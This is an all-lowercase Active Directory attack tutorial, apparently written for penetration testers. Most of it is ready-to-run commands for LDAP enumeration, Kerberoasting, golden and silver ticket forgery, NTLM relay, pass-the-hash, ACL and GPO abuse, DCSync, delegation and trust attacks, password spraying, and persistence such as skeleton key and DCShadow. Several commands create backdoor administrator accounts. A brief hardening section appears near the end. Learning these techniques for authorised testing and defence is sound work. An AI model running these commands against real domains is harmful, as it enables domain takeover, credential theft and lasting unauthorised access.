get-netcomputer -trustedtoauth   # constrained delegation machines ldap — how ad is queried **ldap (lightweight directory access protocol)** is how applications and tools query and modify active directory. ad is essentially a specialised ldap server.

**default ports:**
- `389` — ldap (plaintext / starttls)
- `636` — ldaps (ldap over tls)
- `3268` — global catalog ldap (queries across the entire forest)
- `3269` — global catalog ldaps ldap queries ldap queries use a filter syntax to select objects: (attribute=value)             exact match
(attribute=*value*)           contains (wildcards)
(&(filter1)(filter2))         and
(|(filter1)(filter2))         or
(!(filter))                   not
(attribute=*)                 attribute exists **common ad ldap filters:** # all users
(&(objectcategory=person)(objectclass=user))

# enabled users only
(&(objectcategory=person)(objectclass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))

# kerberoastable (has spn, is user account)
(&(objectcategory=person)(objectclass=user)(serviceprincipalname=*))

# as-rep roastable
(&(objectcategory=person)(objectclass=user)(useraccountcontrol:1.2.840.113556.1.4.803:=4194304))

# unconstrained delegation (computers)
(&(objectcategory=computer)(useraccountcontrol:1.2.840.113556.1.4.803:=524288))

# admin accounts (admincount=1)
(&(objectcategory=person)(objectclass=user)(admincount=1)) **anonymous ldap bind** — some ad environments still allow unauthenticated ldap queries. if so, any user on the network can enumerate the entire domain without credentials. # anonymous bind test
ldapsearch -x -h ldap://10.10.10.100 -b "dc=corp,dc=local"

# authenticated enumeration
ldapsearch -x -h ldap://10.10.10.100 \
    -d "cn=alice,dc=corp,dc=local" \
    -w 'password1!' \
    -b "dc=corp,dc=local" \
    "(objectclass=user)" samaccountname userprincipalname memberof

# get all users with descriptions
ldapsearch -x -h ldap://10.10.10.100 \
    -d "alice@corp.local" -w 'password1!' \
    -b "dc=corp,dc=local" \
    "(&(objectclass=user)(description=*))" \
    samaccountname description

# find kerberoastable accounts
ldapsearch -x -h ldap://10.10.10.100 \
    -d "alice@corp.local" -w 'password1!' \
    -b "dc=corp,dc=local" \
    "(&(objectclass=user)(serviceprincipalname=*))" \
    samaccountname serviceprincipalname

# enum4linux-ng — automated ldap/smb enumeration
enum4linux-ng -a 10.10.10.100
enum4linux-ng -u alice -p 'password1!' -a 10.10.10.100

# windapsearch
python3 windapsearch.py -d corp.local --dc-ip 10.10.10.100 -u alice -p 'password1!' --da
python3 windapsearch.py --dc-ip 10.10.10.100 -u alice -p 'password1!' --users
python3 windapsearch.py --dc-ip 10.10.10.100 -u alice -p 'password1!' --computers
python3 windapsearch.py --dc-ip 10.10.10.100 -u alice -p 'password1!' --privileged-users

# impacket — authenticated enumeration
getadusers.py -all corp.local/alice:password1! -dc-ip 10.10.10.100 kerberos — deep dive kerberos is the primary authentication protocol in ad environments. understanding it at a protocol level is essential — every major ad attack (kerberoasting, golden ticket, silver ticket, unconstrained delegation abuse, constrained delegation abuse) operates by manipulating kerberos. key components - **kdc (key distribution center)** — runs on every dc. has two services: as (authentication service) and tgs (ticket-granting service)
- **tgt (ticket-granting ticket)** — your identity credential. encrypted with `krbtgt`'s hash. valid for 10 hours by default.
- **service ticket (tgs)** — ticket for a specific service. encrypted with the service account's hash.
- **pac (privilege attribute certificate)** — embedded in tickets. contains user's sid, group sids, and privileges. signed by kdc.
- **spn (service principal name)** — unique identifier for a service instance, e.g. `mssqlsvc/db01.corp.local:1433`. kerberos uses spns to locate the right service account. full kerberos flow  client                kdc (dc)               service
   │                      │                      │
   │── as-req ───────────▶│                      │
   │   (username +        │                      │
   │    encrypted         │                      │
   │    timestamp)        │                      │
   │                      │                      │
   │◀─ as-rep ────────────│                      │
   │   (tgt encrypted     │                      │
   │    with krbtgt hash; │                      │
   │    session key enc.  │                      │
   │    with user hash)   │                      │
   │                      │                      │
   │── tgs-req ──────────▶│                      │
   │   (tgt + spn of      │                      │
   │    target service)   │                      │
   │                      │                      │
   │◀─ tgs-rep ───────────│                      │
   │   (service ticket    │                      │
   │    encrypted with    │                      │
   │    service acct hash)│                      │
   │                      │                      │
   │── ap-req ──────────────────────────────────▶│
   │   (service ticket)   │                      │
   │                      │                      │
   │◀─ ap-rep ──────────────────────────────────│
   │   (success + mutual  │                      │
   │    auth if requested)│                      │ why this matters for attacks # ── kerberoasting ────────────────────────────────────────────────────────────
# from linux — impacket (needs valid domain credentials)
getuserspns.py corp.local/alice:password1! -dc-ip 10.10.10.100 -request
getuserspns.py corp.local/alice:password1! -dc-ip 10.10.10.100 -request -outputfile kerb_hashes.txt

# from windows — rubeus
.\rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt
.\rubeus.exe kerberoast /user:sqlsvc /format:hashcat   # target specific account

# from windows — powerview
get-domainspnticket -outputformat hashcat | export-csv -notypeinformation kerb.csv
invoke-kerberoast -outputformat hashcat | select-object hash | out-file kerb.txt

# crack — hashcat mode 13100 = kerberos 5 tgs-rep etype 23
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# ── as-rep roasting ──────────────────────────────────────────────────────────
# from linux — no credentials needed, just usernames
getnpusers.py corp.local/ -usersfile users.txt -format hashcat -no-pass -dc-ip 10.10.10.100
getnpusers.py corp.local/alice:password1! -format hashcat -dc-ip 10.10.10.100  # auto-find targets

# from windows — rubeus
.\rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
.\rubeus.exe asreproast /user:bob /format:hashcat

# crack — hashcat mode 18200 = kerberos 5 as-rep etype 23
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# ── golden ticket ────────────────────────────────────────────────────────────
# prerequisites: krbtgt hash + domain sid + target username
# get krbtgt hash via dcsync:
impacket-secretsdump -just-dc-user krbtgt corp.local/alice:password1!@10.10.10.100

# forge golden ticket (impacket)
ticketconverter.py  # convert formats if needed
lookupsid.py corp.local/alice:password1!@10.10.10.100   # get domain sid

# mimikatz (on windows)
kerberos::golden /user:administrator /domain:corp.local /sid:s-1-5-21-... /krbtgt:<hash> /ptt
# /ptt = pass-the-ticket (inject into current session)

# rubeus
.\rubeus.exe golden /rc4:<krbtgt_ntlm> /domain:corp.local /sid:s-1-5-21-... /user:administrator /ptt

# ── silver ticket ────────────────────────────────────────────────────────────
# prerequisites: service account hash + domain sid + spn
# mimikatz
kerberos::golden /user:administrator /domain:corp.local /sid:s-1-5-21-... \
    /target:dc01.corp.local /service:cifs /rc4:<service_hash> /ptt

# use after /ptt injection:
ls \\dc01.corp.local\c$   # cifs access as administrator ntlm authentication **ntlm** (nt lan manager) is the legacy challenge-response protocol. it's still used when kerberos isn't available — when connecting by ip address instead of hostname, cross-domain scenarios without proper trust config, or when the target doesn't have kerberos configured. ntlm flow  client                             server
   │── negotiate_message ──────────▶│
   │◀─ challenge_message ───────────│  (8-byte nonce)
   │── authenticate_message ────────▶│
   │   ntlmv2 response = hmac-md5(
   │     nt_hash(password),
   │     username + domain + challenge + timestamp
   │   ) **ntlmv1** — weak. uses des. can be cracked with rainbow tables. all modern windows defaults to ntlmv2.
**ntlmv2** — stronger but still capturable and crackable offline if the password is weak. pass-the-hash ntlm authentication uses the **nt hash** of the password, not the password itself. if you have the hash, you *are* the user for ntlm auth purposes — no cracking needed. nt hash: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
          ↑ lm hash (empty/disabled)          ↑ nt hash — this is what matters ntlm relay if you can intercept ntlm authentication, you can **relay** it to a different target rather than cracking it. the victim authenticates to you; you authenticate to the real target using their credentials in real-time.

**requirements:** target must not require signing (smb signing off, which is the default for non-dcs). the relayed account must have admin access to the target.

**responder** captures ntlm authentication by poisoning:
- **llmnr** (link-local multicast name resolution) — responds to failed dns queries
- **nbt-ns** (netbios name service) — older name resolution
- **mdns** — multicast dns

when a machine on the lan tries to access `\\fileserver` (which doesn't exist), llmnr broadcasts. responder responds first and captures the ntlm auth. # ── responder — capture ntlm hashes ──────────────────────────────────────────
# listen on the network and respond to llmnr/nbt-ns/mdns
responder -i eth0 -rdwv
# captures appear in /usr/share/responder/logs/

# crack captured ntlmv2 hashes
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt

# ── ntlm relay (ntlmrelayx) ──────────────────────────────────────────────────
# first: disable responder's smb and http servers
# edit /usr/share/responder/responder.conf
# smb = off
# http = off

# run responder for capture only
responder -i eth0 -rdwv

# run ntlmrelayx to relay to a target (smb signing must be off on target)
impacket-ntlmrelayx -t 10.10.10.5 -smb2support

# relay to multiple targets from a list
impacket-ntlmrelayx -tf targets.txt -smb2support

# execute a command on relay success
impacket-ntlmrelayx -t 10.10.10.5 -smb2support -c "net user hacker p@ssw0rd /add && net localgroup administrators hacker /add"

# socks relay — interactive session
impacket-ntlmrelayx -t 10.10.10.5 -smb2support -socks
# then use impacket tools via proxychains:
proxychains impacket-secretsdump 'corp/administrator@10.10.10.5'

# ── pass-the-hash ─────────────────────────────────────────────────────────────
# impacket-psexec with hash
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@10.10.10.5

# crackmapexec pth
crackmapexec smb 10.10.10.0/24 -u administrator -h 8846f7eaee8fb117ad06bdd830b7586c

# evil-winrm pth
evil-winrm -i 10.10.10.5 -u administrator -h 8846f7eaee8fb117ad06bdd830b7586c

# mimikatz (windows)
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe

# check smb signing across subnet (identify relay targets)
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt group policy objects (gpos) **group policy** is how ad pushes configuration to computers and users across the domain. a **gpo** (group policy object) is a container of settings that is **linked** to a site, domain, or ou — it applies to all objects within that scope. gpo processing group policy is applied in this order, with later items winning on conflict:
1. **local** — the machine's own local policy
2. **site** — gpos linked to the ad site
3. **domain** — gpos linked to the domain
4. **ou** — gpos linked to each ou in the path, outermost to innermost

this is called **lsdou**. the ou closest to the object wins (except **enforced** gpos which cannot be overridden, and **block inheritance** which blocks parent gpos).

gpos are stored in two places:
- **ad**: `cn=policies,cn=system,dc=corp,dc=local` — metadata and settings
- **sysvol**: `\\corp.local\sysvol\corp.local\policies\{guid}\` — the actual policy files

sysvol is replicated via **dfs-r** (or legacy frs) to all dcs and is readable by all domain users. gpo attack surface - **writable gpo** — if you have `write` permissions on a gpo, you can push any code to every machine it applies to, running as system
- **gpo create rights** — `group policy creator owners` group members can create gpos but not link them — only admins can link
- **writable gpo link on ou** — if you have `genericwrite` or `writedacl` on an ou, you can link a gpo to it
- **sysvol** — any domain user can read sysvol. historically, group policy preferences (gpp) stored admin credentials in xml files here in a weakly encrypted form — `cpassword`. these are decryptable with a publicly known aes key. this was patched in ms14-025 but the files remain readable if an admin created them before the patch. # list all gpos
get-gpo -all | select displayname, gpostatus, creationtime, modificationtime
get-gpo -all | select displayname, id

# gpo links — what's applied to which ous
get-gpinheritance -target "ou=workstations,dc=corp,dc=local"

# gpo permissions — who can edit which gpo
get-gpo -all | foreach-object {
    $gpo = $_
    get-gppermission -guid $gpo.id -all | 
        where { $_.permission -match 'modify|edit|fullcontrol' } | 
        select @{n='gpo';e={$gpo.displayname}}, trustee, permission
}

# powerview — gpo abuse hunting
get-domaingpo | select displayname, cn
get-domaingpolocalgroup    # gpos that set local group membership
get-domaingpouserlocalgroupmapping -localgroup administrators  # users getting local admin via gpo

# check gpo on your own machine
gpresult /r              # resultant set of policy
gpresult /h gpo.html     # html report

# sysvol — hunt for gpp passwords
# windows
findstr /s /i cpassword \\corp.local\sysvol\corp.local\policies\*.xml
# powershell
get-childitem -recurse \\corp.local\sysvol -include *.xml -erroraction silentlycontinue | 
    select-string cpassword

# linux
smb://corp.local/sysvol browsing:
smbclient //10.10.10.100/sysvol -u 'alice%password1!' -c 'recurse; ls'
# impacket — find gpp passwords
impacket-get-gpppassword 'corp.local/alice:password1!@10.10.10.100'

# decrypt a gpp cpassword
gpp-decrypt "edbshowhzltjt/qs9feicj7ckpesglz4melf1ibvl7i="  # kali tool

# sharpgpoabuse — modify a gpo if you have write access
.\sharpgpoabuse.exe --addcomputertask --taskname "update" \
    --author nt_authority\system \
    --command "cmd.exe" \
    --arguments "/c net user backdoor p@ssw0rd /add" \
    --gponame "workstation policy"

gpupdate /force   # force policy refresh on target acl-based attacks every ad object has a security descriptor containing a dacl — exactly like ntfs files. these acls control who can read, write, modify, and delete ad objects. **misconfigured ad acls are one of the richest privilege escalation paths in real environments.** high-value ad ace rights attack chains acl attacks are chained — you follow the path: you → genericwrite on user a → set a's spn → kerberoast a
                               or set a's scriptpath → code execution as a

you → forcechangepassword on user b → reset b's password → log in as b

you → writedacl on group c → grant yourself addmember → join group c

you → genericall on computer d → add machine account to delegation → shadow credentials **bloodhound** visualises all of these chains across the entire domain as a graph. you can find 5-hop attack paths that no manual enumeration would ever uncover. # ── enumerate acls with powerview ────────────────────────────────────────────
# find all interesting aces across the domain
find-interestingdomainacl -resolveguids | 
    select objectdn, acetype, activedirectoryrights, identityreferencename |
    where { $_.identityreferencename -notmatch 'domain admins|enterprise admins|system|administrators' }

# check acl on a specific object
get-domainobjectacl -identity alice -resolveguids
get-domainobjectacl -identity "domain admins" -resolveguids
get-domainobjectacl -identity "dc=corp,dc=local" -resolveguids  # domain object

# find objects alice has rights over
get-domainobjectacl -resolveguids | 
    where { $_.securityidentifier -eq (get-domainuser alice).objectsid }

# ── abuse: forcechangepassword ────────────────────────────────────────────────
$cred = get-credential  # use alice's creds
$newpass = convertto-securestring 'newp@ssw0rd!' -asplaintext -force
set-domainuserpassword -identity bob -accountpassword $newpass -credential $cred

# ── abuse: genericwrite — set spn (kerberoast the target) ─────────────────────
set-domainobject -identity bob -set @{ serviceprincipalname='nonexistent/blah' } -verbose
# now kerberoast bob:
get-domainspnticket -username bob -outputformat hashcat
# clean up:
set-domainobject -identity bob -clear serviceprincipalname

# ── abuse: addmember ─────────────────────────────────────────────────────────
add-domaingroupmember -identity 'domain admins' -members 'alice'
# verify:
get-domaingroupmember -identity 'domain admins' | select membername

# ── abuse: writedacl ─────────────────────────────────────────────────────────
# grant alice dcsync rights on the domain
add-domainobjectacl -targetidentity "dc=corp,dc=local" \
    -principalidentity alice \
    -rights dcsync
# now dcsync:
impacket-secretsdump corp.local/alice:password1!@10.10.10.100 -just-dc

# ── dcsync ───────────────────────────────────────────────────────────────────
# from linux (requires replication rights)
impacket-secretsdump -just-dc corp.local/alice:password1!@10.10.10.100
impacket-secretsdump -just-dc-user krbtgt corp.local/alice:password1!@10.10.10.100
impacket-secretsdump -just-dc-user administrator corp.local/alice:password1!@10.10.10.100

# from windows — mimikatz
lsadump::dcsync /user:krbtgt /domain:corp.local
lsadump::dcsync /user:administrator /domain:corp.local
lsadump::dcsync /all /csv delegation **kerberos delegation** allows a service to authenticate to other services on behalf of a user. this is used by legitimate services (e.g., a web app authenticating to a backend database as the logged-in user) but is a major attack surface. unconstrained delegation the service account (or computer account) can impersonate any user to **any** service. when a user authenticates to a service with unconstrained delegation, their **tgt is sent to that service** and stored in memory.

**attack:** compromise a machine with unconstrained delegation. any user (including domain admins) who authenticates to that machine leaves their tgt in memory. extract it with mimikatz and reuse it.

**printer bug / spoolsample:** force a dc to authenticate to a machine with unconstrained delegation by triggering `ms-rprn` (print spooler). the dc authenticates, its tgt lands in memory → extract → dcsync without needing to touch the dc directly. constrained delegation the service account can impersonate users but only to **specific allowed services** (listed in `msds-allowedtodelegateto`). two modes:
- **kcd (kerberos constrained delegation)** — kerberos-only
- **kcd with protocol transition (`trusted_to_auth_for_delegation`)** — can use s4u2self to get a service ticket for any user regardless of how they originally authenticated (including non-kerberos)

**attack:** compromise service account with constrained delegation. use s4u2self to get a service ticket as `administrator` for yourself, then s4u2proxy to delegate it to the allowed target service → admin access to the target. resource-based constrained delegation (rbcd) in rbcd, the **target machine** controls who can delegate to it (`msds-allowedtoactonbehalfofotheridentity`). if you have `genericwrite` on a computer object, you can add any machine account to this list, then use that machine account to impersonate any user to the target → full access. # ── find delegation configurations ──────────────────────────────────────────
# unconstrained delegation (excluding dcs — they always have it)
get-adcomputer -filter { trustedfordelegation -eq $true } | select name
get-aduser    -filter { trustedfordelegation -eq $true } | select samaccountname

# constrained delegation
get-adcomputer -filter { msds-allowedtodelegateto -ne "$null" } `
    -properties msds-allowedtodelegateto | select name, msds-allowedtodelegateto
get-aduser -filter { msds-allowedtodelegateto -ne "$null" } `
    -properties msds-allowedtodelegateto | select samaccountname, msds-allowedtodelegateto

# powerview
get-netcomputer -unconstrained -verbose
get-netcomputer -trustedtoauth | select name, msds-allowedtodelegateto
get-netuser -trustedtoauth | select samaccountname, msds-allowedtodelegateto

# ── unconstrained delegation — extract tgts from memory ─────────────────────
# after compromising a machine with unconstrained delegation:
# mimikatz
sekurlsa::tickets /export   # export all tickets to .kirbi files
kerberos::ptt ticket.kirbi  # inject a ticket (pass-the-ticket)

# rubeus — monitor for new tgts
.\rubeus.exe monitor /interval:5 /nowrap   # watch for incoming tgts

# trigger dc to authenticate to our box (printer bug)
.\spoolsample.exe dc01.corp.local compromised01.corp.local
# then capture dc's tgt from memory with rubeus monitor

# ── constrained delegation (s4u) ─────────────────────────────────────────────
# request service ticket as administrator for allowed service
# rubeus (on compromised account with constrained delegation)
.\rubeus.exe s4u /user:websvc /rc4:<websvc_hash> /impersonateuser:administrator \
    /msdsspn:cifs/fileserver.corp.local /ptt

# impacket
getst.py -spn cifs/fileserver.corp.local -impersonate administrator \
    corp.local/websvc:password1! -dc-ip 10.10.10.100
export krb5ccname=administrator.ccache
impacket-psexec -k -no-pass corp.local/administrator@fileserver.corp.local

# ── rbcd attack ──────────────────────────────────────────────────────────────
# prerequisites: genericwrite on target computer, ability to create machine account
# create attacker-controlled machine account (default: domain users can create up to 10)
new-machineaccount -machineaccount fakecomputer -password (convertto-securestring 'fakep@ss1!' -asplaintext -force)

# set rbcd on the target — allow fakecomputer to delegate to it
$fakesid = (get-domaincomputer fakecomputer).objectsid
$sd = new-object security.accesscontrol.rawsecuritydescriptor "o:bad:(a;;ccdclcswrpwpdtlocrsdrcwdwo;;;$fakesid)"
$sdbytes = new-object byte[] ($sd.binarylength)
$sd.getbinaryform($sdbytes, 0)
get-domaincomputer targetserver | set-domainobject -set @{ 'msds-allowedtoactonbehalfofotheridentity'=$sdbytes }

# now s4u attack to impersonate administrator on targetserver
.\rubeus.exe s4u /user:fakecomputer$ /rc4:<fakecomputer_hash> \
    /impersonateuser:administrator /msdsspn:cifs/targetserver.corp.local /ptt bloodhound — attack path mapping **bloodhound** maps active directory as a graph database (neo4j) and reveals attack paths from any starting point to domain admin. it's arguably the most impactful ad security tool ever built — it finds privilege escalation chains through acl misconfigurations, delegation, group membership, and trust relationships that would take days to find manually.

**sharphound** is the data collector — it runs on windows (or from linux with `bloodhound-python`) and collects:
- group memberships
- acls on all objects
- sessions (who is logged in where)
- trusts
- gpos and ou structures
- delegation configurations
- local group memberships key bloodhound queries -- find shortest paths to domain admins from any owned user
match p=shortestpath((u:user {owned:true})-[*1..]->(g:group {name:"domain admins@corp.local"}))
return p

-- all domain admin group members
match (u:user)-[:memberof*1..]->(g:group {name:"domain admins@corp.local"}) return u

-- kerberoastable users
match (u:user {hasspn:true, enabled:true}) return u

-- as-rep roastable users
match (u:user {dontreqpreauth:true, enabled:true}) return u

-- computers with unconstrained delegation
match (c:computer {unconstraineddelegation:true}) return c

-- users with dcsync rights
match p=(u)-[:getchangesall|getchanges*1..2]->(d:domain) return p # ── sharphound — collect from windows ────────────────────────────────────────
# all collection methods (comprehensive)
.\sharphound.exe -c all
.\sharphound.exe -c all,gpolocalgroup

# stealth mode (less noisy — avoids session enumeration)
.\sharphound.exe -c dconly

# specific domain, custom output path
.\sharphound.exe -d corp.local -c all --outputdirectory c:\temp\

# loop collection (catch transient sessions)
.\sharphound.exe --loop --loopduration 01:00:00 --loopinterval 00:05:00

# ── bloodhound-python — collect from linux ────────────────────────────────────
pip3 install bloodhound
bloodhound-python -u alice -p 'password1!' -d corp.local -ns 10.10.10.100 -c all
bloodhound-python -u alice -p 'password1!' -d corp.local -ns 10.10.10.100 -c all --zip

# ── start bloodhound ─────────────────────────────────────────────────────────
# start neo4j
sudo neo4j start
# open bloodhound gui
bloodhound &
# default creds: neo4j:neo4j (change on first login)

# upload collected zip/json files via bloodhound ui → upload data

# ── raw cypher queries (neo4j browser: http://localhost:7474) ─────────────────
# shortest path from owned node to da
match p=shortestpath((u:user {owned:true})-[*1..]->(g:group {name:"domain admins@corp.local"}))
return p limit 25

# owned users with paths to da
match (u:user {owned:true}), (g:group {name:"domain admins@corp.local"}),
    p=shortestpath((u)-[*1..]->(g))
return p

# high-value targets reachable from compromised computer
match p=shortestpath((c:computer {owned:true})-[*1..]->(t:computer {highvalue:true}))
return p

# kerberoastable da-path
match (u:user {hasspn:true}) where not u.name starts with 'krbtgt'
    and u.enabled = true
match p=shortestpath((u)-[*1..]->(g:group {name:"domain admins@corp.local"}))
return p trust attacks — cross-domain & cross-forest child-to-parent domain escalation (extrasids) within a forest, all domains trust each other transitively. if you own a child domain, you can escalate to the parent (and therefore the entire forest) using **sid history injection**.

when a user is migrated between domains, their old sid is preserved in the `sidhistory` attribute — the target domain includes it in their access token. if you can add arbitrary sids to a forged ticket, you can include the **enterprise admins sid** from the forest root domain.

**requirements:** `krbtgt` hash from the child domain. 1. get child domain krbtgt hash (dcsync from child dc)
2. get child domain sid and parent domain sid
3. forge golden ticket for child domain with parent's enterprise admins sid in extrasids
4. access any resource in the parent domain as enterprise admin cross-forest trust abuse if there is a bidirectional forest trust between `corp.local` and `partner.local`, users in each forest can access resources in the other. forest trusts have a **sid filtering** boundary — sids from the other forest are stripped unless explicitly allowed.

**sid filtering bypass:** if sid filtering is disabled (or `quarantine` flag is off), you can inject sids from the trusted forest into your tickets — same extrasids technique across the trust boundary.

**trust ticket abuse:** with the inter-forest trust key, you can forge inter-realm tgts and move between forests without valid credentials in the target forest. # ── get the info needed ──────────────────────────────────────────────────────
# child domain sid
get-addomain -identity child.corp.local | select domainsid

# parent domain sid
get-addomain -identity corp.local | select domainsid

# enterprise admins sid = parent sid + -519
# if parent sid is s-1-5-21-1234-5678-9012, ea sid = s-1-5-21-1234-5678-9012-519

# dcsync from child dc to get krbtgt hash
impacket-secretsdump -just-dc-user krbtgt child.corp.local/admin:password1!@childdc.child.corp.local

# ── forge golden ticket with extrasids ───────────────────────────────────────
# mimikatz
kerberos::golden \
    /user:administrator \
    /domain:child.corp.local \
    /sid:s-1-5-21-child-sid \
    /krbtgt:<child_krbtgt_hash> \
    /sids:s-1-5-21-parent-sid-519 \
    /ptt

# rubeus
.\rubeus.exe golden \
    /rc4:<child_krbtgt_hash> \
    /domain:child.corp.local \
    /sid:s-1-5-21-child-sid \
    /sids:s-1-5-21-parent-sid-519 \
    /user:administrator \
    /ptt

# verify — access parent dc
ls \\parentdc.corp.local\c$
enter-pssession -computername parentdc.corp.local

# or with impacket — ticketer.py
ticketconverter.py golden.kirbi golden.ccache
export krb5ccname=golden.ccache
impacket-secretsdump -k -no-pass corp.local/administrator@parentdc.corp.local password spraying & credential attacks **password spraying** — try one password against many accounts rather than many passwords against one account. avoids account lockout (one bad attempt per account, vs. lockout threshold usually 5-10).

**strategy:** query the domain password policy first, then spray at safe intervals.

common spray passwords:
- season+year: `summer2024!`, `winter2023!`, `spring2025`
- company name variations: `companyname1!`, `welcome1`
- generic: `password1!`, `p@ssw0rd`, `welcome1!`, `monday1!`

**username formats to try:**
- `alice.smith` (most common in ad)
- `asmith`
- `alice_smith`
- `alice`
- `smithalice` # ── get domain password policy before spraying ────────────────────────────────
# without credentials (anonymous smb)
enum4linux-ng -p 10.10.10.100
crackmapexec smb 10.10.10.100 --pass-pol

# with credentials
get-addefaultdomainpasswordpolicy
net accounts /domain

# key values: lockout threshold, lockout observation window
# spray below the threshold — if threshold=5, spray max 3 attempts

# ── username enumeration ──────────────────────────────────────────────────────
# kerbrute — kerberos-based (no logs in many configs, no ldap needed)
./kerbrute userenum --dc 10.10.10.100 -d corp.local usernames.txt

# generate username list from names
# https://github.com/urbanadventurer/username-anarchy
username-anarchy -f firstname.lastname -i names.txt > users.txt

# ── password spraying ─────────────────────────────────────────────────────────
# kerbrute — kerberos spray (very quiet)
./kerbrute passwordspray --dc 10.10.10.100 -d corp.local users.txt 'password1!'

# crackmapexec — smb spray
crackmapexec smb 10.10.10.100 -u users.txt -p 'summer2024!' --continue-on-success
crackmapexec smb 10.10.10.100 -u users.txt -p passwords.txt --no-bruteforce  # one password per user

# spray via winrm
crackmapexec winrm 10.10.10.100 -u users.txt -p 'password1!'

# spray via ldap
crackmapexec ldap 10.10.10.100 -u users.txt -p 'password1!'

# domainpasswordspray (powershell)
import-module .\domainpasswordspray.ps1
invoke-domainpasswordspray -userlist users.txt -password 'summer2024!' -outfile spray_results.txt

# ── detect if account exists (osint / no-auth) ────────────────────────────────
# kerberos pre-auth error vs principal unknown:
# kdc_err_preauth_required = user exists
# kdc_err_c_principal_unknown = user does not exist
./kerbrute userenum --dc 10.10.10.100 -d corp.local users.txt -v persistence in active directory domain-level persistence is more powerful than host-level — it survives machine reimaging, password resets, and many defensive responses. # ── adminsdholder acl persistence ────────────────────────────────────────────
# add genericall for 'alice' to adminsdholder
# sdprop will propagate this to all protected accounts every 60 min
add-domainobjectacl -targetidentity 'cn=adminsdholder,cn=system,dc=corp,dc=local' `
    -principalidentity alice -rights all -verbose

# trigger sdprop manually (don't wait 60 min)
$rootdse = [adsi]"ldap://rootdse"
$rootdse.put("runprotectadmingroupstask", "1")
$rootdse.setinfo()

# verify — alice should now have genericall on domain admins
get-domainobjectacl -identity 'domain admins' -resolveguids | 
    where { $_.securityidentifier -match 'alice' }

# ── dcsync rights grant ───────────────────────────────────────────────────────
add-domainobjectacl -targetidentity 'dc=corp,dc=local' `
    -principalidentity alice `
    -rights dcsync

# ── dsrm account enable ──────────────────────────────────────────────────────
# enable dsrm account for network logon (requires dc admin)
new-itemproperty "hklm:\system\currentcontrolset\control\lsa" `
    -name dsrmadminlogonbehavior -value 2 -propertytype dword
# now can pth with dsrm hash:
# sekurlsa::pth /domain:dc01 /user:administrator /ntlm:<dsrm_hash> /run:powershell

# ── skeleton key (mimikatz — volatile, lost on dc reboot) ────────────────────
# run on domain controller
privilege::debug
misc::skeleton
# all domain accounts can now authenticate with password: mimikatz

# ── sid history injection ────────────────────────────────────────────────────
# add enterprise admin sid to alice's sidhistory
# requires stopping/starting ad ds and using ntdsutil or mimikatz
miscillaneous::addsid /user:alice /sids:s-1-5-21-forest-root-sid-519

# ── dcshadow ─────────────────────────────────────────────────────────────────
# register as fake dc and push arbitrary ad attribute changes
# requires two mimikatz instances and da privileges
# instance 1: set the changes to push
lsadump::dcshadow /object:alice /attribute:sidhistory /value:s-1-5-21-...-519
# instance 2: execute the replication push
lsadump::dcshadow /push detection & defence understanding the attacks is half the job — understanding how they're detected completes the picture. key event ids for ad monitoring hardening recommendations - **enable smb signing** on all machines — prevents ntlm relay
- **disable llmnr and nbt-ns** — prevents responder captures
- **enable protected users** security group for all privileged accounts — no ntlm, no unconstrained delegation, no credential caching
- **tiered administration model** — domain admins never log into workstations; different admin accounts per tier
- **disable print spooler on dcs** — prevents printer bug tgt capture
- **enable aes-only kerberos** for service accounts — makes kerberoasting output uncrackable in practice
- **laps (local administrator password solution)** — unique random local admin passwords per machine, stored in ad — prevents lateral movement with one hash across all machines
- **credential guard** — virtualisation-based isolation of lsass — mimikatz cannot dump plaintext creds
- **regular bloodhound runs** — find your own acl paths before attackers do
- **audit privileged group membership** — automate alerts on changes to domain admins, enterprise admins key takeaways **concepts to have cold:**

- ntds.dit on every dc contains every domain account's ntlm hash — it is the single most valuable file in an enterprise network
- `krbtgt` hash = golden ticket = impersonate anyone in the domain forever. rotating krbtgt (twice) is the only remediation after a confirmed golden ticket
- kerberoasting requires zero privileges beyond being a domain user. any account with an spn is a target. service accounts often have weak passwords set years ago and never rotated
- as-rep roasting works even without credentials — just a valid username list. check `dont_require_preauth` on every engagement
- ntlm relay is nearly always possible if smb signing is not enforced — and it's off by default everywhere except dcs. responder + ntlmrelayx is a standard first-hour move on internal engagements
- acl misconfigurations are endemic. bloodhound finds paths that humans would never find manually. run it on every internal engagement before anything else
- `seimpersonateprivilege` on a service account → system in under a minute via potato attacks. iis, mssql, and many other service accounts have it
- trusts extend the blast radius. owning a child domain means owning the forest root via extrasids. always map trusts immediately
- the `description` field on ad users frequently contains passwords set by it for initial account setup and never cleared. query it on every engagement
- bloodhound, rubeus, and impacket are the three tool families to master. everything else is optional

**tools to know:**
`bloodhound/sharphound`, `impacket suite`, `rubeus`, `mimikatz`, `crackmapexec`, `responder`, `ntlmrelayx`, `kerbrute`, `powerview`, `powerup`, `evil-winrm`, `hashcat`
